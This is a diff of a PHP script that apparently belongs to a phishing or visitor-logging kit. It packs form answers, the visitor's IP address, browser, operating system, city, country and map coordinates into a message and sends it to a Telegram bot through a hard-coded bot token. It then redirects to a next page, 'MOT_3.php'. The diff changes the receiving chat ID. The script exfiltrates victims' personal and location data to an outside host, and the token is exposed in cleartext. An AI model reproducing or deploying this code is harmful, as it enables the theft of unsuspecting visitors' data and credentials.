@@ -175,13 +175,15 @@ if ($success==false) {
 
 $message = "$an1\n$an2\n$an3\n\n=======================\n\nCLICKED ON $date AT $time\n\n $ip\n\n$uaget\n\n$uos\n$bsr\n\n$is\n\n$city\n$country\n$continent\n\n maps.google.com/?q=$la$lh$lp\n\n======$project==== \n";
  
-$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
+$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA";
 $data = [
-    'chat_id' => '-1001831940786',
+    'chat_id' => '-821080105',
     'text' => $message
 ];
+
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
-                                 http_build_query($data) );
+    http_build_query($data));
+
 
 
 header('Location: MOT_3.php');
